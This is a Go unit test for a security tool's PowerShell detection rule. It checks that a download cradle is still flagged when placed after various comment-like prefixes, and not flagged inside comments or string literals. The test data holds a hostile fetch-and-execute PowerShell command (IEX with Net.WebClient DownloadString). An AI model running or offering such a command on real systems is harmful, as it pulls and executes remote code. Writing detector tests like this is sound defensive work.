package detect

import (
	"testing"
	"tracefall/internal/model"
)

func TestReviewPowerShellCommentTokenBoundary(t *testing.T) {
	expr := `IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`
	for _, prefix := range []string{`Write-Output foo#bar; `, `Write-Output foo<#bar; `, `Write-Output foo<#bar#>; `, "Write-Output foo`#bar; ", "Write-Output foo` bar#baz; "} {
		t.Run(prefix, func(t *testing.T) {
			fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventPowerShellScript, CommandLine: prefix + expr}})
			if len(fs) != 1 || fs[0].Severity != "high" || fs[0].Confidence != "medium" {
				t.Fatalf("token hash hid invocation: %+v", fs)
			}
		})
	}
	for _, body := range []string{"Write-Output foo #bar; " + expr, "Write-Output foo;#bar; " + expr, "Write-Output <#bar; " + expr + " #>", `Write-Output 'foo#bar; ` + expr + `'`, `Write-Output "foo<#bar; ` + expr + `"`} {
		if labels := powerShellRuleIndicators(body, true); len(labels) != 0 {
			t.Fatalf("comment/literal activated: %+v", labels)
		}
	}
}
